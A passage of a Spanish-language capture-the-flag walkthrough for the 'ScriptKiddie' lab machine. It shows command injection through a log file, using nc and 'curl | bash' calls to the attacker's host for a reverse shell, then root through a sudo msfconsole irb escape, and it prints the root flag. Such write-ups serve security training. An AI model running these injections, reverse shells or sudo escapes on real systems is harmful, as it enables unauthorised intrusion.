```sh
kid@scriptkiddie:/home$ ls -l pwn/scanlosers.sh
-rwxrwxr-- 1 pwn pwn 250 Jan 28  2021 pwn/scanlosers.sh
```

Podemos pensar en hacer lo mismo en la máquina víctima pero habría que cambiar de comando, porque el output del **id** no lo tendríamos porque ver, es un comando que se ejecuta en segundo plano digamos. Podríamos lanzarnos un ping a nuestra IP, eso si podríamos verlo:

```sh
# En local me pongo en escucha:
❯ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

En remoto -box objetivo-:

```sh
kid@scriptkiddie:~/logs$ echo "Hola Paco 10.10.14.19 ;ping -c 1 10.10.14.19 #" > hackers
kid@scriptkiddie:~/logs$ 
```

Y parece que funciona:

```sh
❯ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
02:14:09.482671 IP 10.10.10.226 > 10.10.14.19: ICMP echo request, id 2, seq 1, length 64
02:14:09.482685 IP 10.10.14.19 > 10.10.10.226: ICMP echo reply, id 2, seq 1, length 64
```

Tenemos RCE esta vez con el usuario pwn, al menos creo que es ese usuario. Voy a comprobarlo:

```sh
kid@scriptkiddie:~/logs$ echo "Hola Paco 10.10.14.19 ;whoami | nc 10.10.14.19 443 #" > hackers
```

Y en local escuchando con nc:

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.226] 33660
pwn
```

Confirmamos que esa tarea la ejecuta el usuario **pwn**.

Aprovechando que nos creamos el index.html, vamos hacer lo mismo. Y con suerte conseguirmos una shell esta vez con el usuario **pwn**.

```sh
# Me pongo en escucha abriendo un servidor en python3. En mismo directorio que el index.html
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

En otra consola en local me pongo en escucha:

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
```

Y ahora en máquina víctima:

```sh
kid@scriptkiddie:~/logs$ echo "Hola Paco 10.10.14.19 ;curl 10.10.14.19 | bash #" > hackers
kid@scriptkiddie:~/logs$ 
```

Funciona!. Recibimos por el listener la shell:

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.226] 33664
bash: cannot set terminal process group (850): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
```

Y hacemos el mismo **tratamiento de la TTY** que antes.

## Escalada Final

```sh
pwn@scriptkiddie:~$ id     
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Tenemos permisos de sudo como el usuario root para ejecutar msfconsole. Si echamos un vistazo a la página GTFOBins y filtramos por msfconsole encontramos que es vulnerable a escalada de privilegios, debido a que podemos salirnos del entorno restringido usando el comando **irb** el cual spawnea un shell interactivo. Dejo [por aquí la página](https://gtfobins.github.io/gtfobins/msfconsole/#sudo). Y probemos si funciona:

```sh
pwn@scriptkiddie:~$ sudo msfconsole

... SNIP ...

Metasploit tip: Use help <command> to learn more about any command

msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
root@scriptkiddie:/home/pwn# whoami
root
```

¡Funciono!. Estamos como el usuario root. Hemos pwneado la máquina. Finalmente conseguiremos la flag última:

```sh
root@scriptkiddie:/home/pwn# cd /root
root@scriptkiddie:~# ls
root.txt  snap
root@scriptkiddie:~# cat root.txt
f5fb9ff01b4a065dbc251349865c2297
```

¡Fin!. Ha sido entretenido. La práctica hace al maestro.



